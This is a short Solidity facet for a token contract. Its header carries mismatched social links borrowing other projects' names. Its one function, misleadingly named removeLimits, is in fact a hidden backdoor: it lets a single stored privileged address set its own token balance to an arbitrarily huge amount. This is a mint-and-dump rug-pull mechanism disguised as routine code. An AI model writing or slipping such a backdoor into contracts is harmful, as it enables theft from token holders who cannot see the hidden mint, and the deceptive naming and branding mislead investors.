/*  
   * SPDX-License-Identifier: MIT

     // Telegram: https://twitter.com/gomblegames
    // Twitter: https://twitter.com/gomblegames
    // Website: https://www.aethir.com/
    // Discord: https://discord.com/invite/gomblegames
    // Medium:  https://medium.com/@gomblegames
*/

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
